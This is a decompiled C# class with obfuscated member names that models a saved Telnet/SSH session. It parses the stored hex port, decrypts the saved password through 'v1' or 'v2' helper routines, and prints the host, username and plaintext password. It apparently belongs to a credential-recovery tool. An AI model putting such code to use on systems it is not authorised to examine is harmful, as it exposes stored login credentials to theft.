using System;
using System.Globalization;
using System.Runtime.CompilerServices;

internal class j
{
    [CompilerGenerated]
    private string m_a;

    [CompilerGenerated]
    private int m_b;

    [CompilerGenerated]
    private string m_c;

    [CompilerGenerated]
    private string m_d;

    [CompilerGenerated]
    private string m_e;

    [CompilerGenerated]
    private string m_f;

    [CompilerGenerated]
    private string m_g;

    public string h;

    [CompilerGenerated]
    public string a()
    {
        return this.m_a;
    }

    [CompilerGenerated]
    public void b(string A_0)
    {
        this.m_a = A_0;
    }

    [CompilerGenerated]
    public int b()
    {
        return this.m_b;
    }

    [CompilerGenerated]
    public void a(int A_0)
    {
        this.m_b = A_0;
    }

    [CompilerGenerated]
    public string c()
    {
        return this.m_c;
    }

    [CompilerGenerated]
    public void c(string A_0)
    {
        this.m_c = A_0;
    }

    [CompilerGenerated]
    public string d()
    {
        return this.m_d;
    }

    [CompilerGenerated]
    public void d(string A_0)
    {
        this.m_d = A_0;
    }

    [CompilerGenerated]
    public string e()
    {
        return this.m_e;
    }

    [CompilerGenerated]
    public void e(string A_0)
    {
        this.m_e = A_0;
    }

    [CompilerGenerated]
    public string f()
    {
        return this.m_f;
    }

    [CompilerGenerated]
    public void f(string A_0)
    {
        this.m_f = A_0;
    }

    [CompilerGenerated]
    public string g()
    {
        return this.m_g;
    }

    [CompilerGenerated]
    public void g(string A_0)
    {
        this.m_g = A_0;
    }

    public static byte[] a(string A_0)
    {
        if (A_0.Length % 2 != 0)
        {
            throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[1]
            {
                A_0
            }));
        }
        byte[] array = new byte[A_0.Length / 2];
        for (int i = 0; i < array.Length; i++)
        {
            string s = A_0.Substring(i * 2, 2);
            array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
        }
        return array;
    }

    public override string ToString()
    {
        return "\tProtocol: " + d() + "\n\tUsername: " + c() + "\n\tHostname: " + a() + ":" + b() + "\n\tPassword: " + h;
    }

    public void i()
    {
        string a_ = "";
        switch (d())
        {
            case "Telnet/SSL":
                a_ = e();
                break;
            case "SSH2":
                a_ = g();
                break;
            case "SSH1":
                a_ = f();
                break;
            case "Telnet":
                a_ = e();
                break;
        }
        byte[] array = a(a_);
        if (BitConverter.IsLittleEndian)
        {
            Array.Reverse(array);
        }
        a(BitConverter.ToInt32(array, 0));
    }

    public void a(string A_0, string A_1, string A_2 = "")
    {
        if (A_0.Equals(""))
        {
            h = "";
            return;
        }
        if (A_0.StartsWith("02:"))
        {
            A_0 = A_0.Substring(3);
        }
        try
        {
            if (!(A_1 == "v1"))
            {
                if (A_1 == "v2")
                {
                    h = new m(A_2).b(A_0);
                }
            }
            else
            {
                h = new l().b(A_0);
            }
        }
        catch (Exception)
        {
            h = "";
        }
    }
}
